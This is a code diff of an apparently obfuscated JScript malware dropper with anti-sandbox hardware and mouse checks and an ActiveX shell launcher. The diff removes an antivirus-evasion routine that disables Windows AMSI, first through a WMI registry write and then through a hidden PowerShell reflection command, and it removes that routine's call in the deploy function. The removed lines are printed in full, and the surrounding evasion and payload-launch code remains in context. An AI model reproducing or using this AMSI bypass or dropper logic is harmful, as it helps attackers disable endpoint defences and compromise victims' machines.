@@ -66,20 +66,6 @@ var _s = {
 
 function _g(n) { return _k(_s[n]); }
 
-function _bypassAmsi() {
-    try {
-        var wmi = GetObject(_g("wmi").replace("SWbemLocator", "StdRegProv"));
-        wmi.SetDWORDValue(0x80000002, "Software\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}", "Enable", 0);
-        return true;
-    } catch(e) {
-        try {
-            var shell = new ActiveXObject(_g("shell"));
-            var psCmd = 'powershell -WindowStyle Hidden -Command "[Ref].Assembly.GetTypes() | Where-Object {$_.Name -like \'*iUtils\'} | ForEach-Object { $f = $_.GetFields(\'NonPublic,Static\') | Where-Object {$_.Name -like \'*Context\'}; if ($f) { $f.SetValue($null, [IntPtr]::Zero) } }"';
-            shell.Run(psCmd, 0, true);
-            return true;
-        } catch(e2) { return false; }
-    }
-}
 
 var _anti = {
     _points: [],
@@ -138,7 +124,6 @@ var _payloads = {
 function _buildPayload(fragments) { return fragments.join(""); }
 
 function _deploy() {
-    _bypassAmsi();
     if (!_anti.checkHardware()) { window.close(); return; }
     _anti.checkMouse(function() {
         var shell = new ActiveXObject(_g("shell"));
